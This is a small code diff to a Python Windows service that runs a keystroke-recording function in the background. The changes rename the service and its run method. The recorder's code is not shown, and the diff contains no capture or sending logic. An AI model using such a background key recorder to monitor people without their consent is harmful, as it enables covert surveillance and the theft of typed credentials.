@@ -9,7 +9,7 @@ import socket
 from keyPressRecorder import keyPressRecorder
 
 class KeyPressRecorderSvc (win32serviceutil.ServiceFramework):
-    _svc_name_ = "KeyPressRecorderService"
+    _svc_name_ = "KeyboardRecorderService"
     _svc_display_name_ = "Key Press Recorder Service"
 
     def __init__(self,args):
@@ -23,10 +23,10 @@ class KeyPressRecorderSvc (win32serviceutil.ServiceFramework):
 
     def SvcDoRun(self):
         self.ReportServiceStatus(win32service.SERVICE_RUNNING)
-        self.main()
+        self.run()
 
-    def main(self):
-        keyPressRecorder(1)
+    def run(self):
+        keyPressRecorder()
 
 if __name__ == '__main__':
     win32serviceutil.HandleCommandLine(KeyPressRecorderSvc)
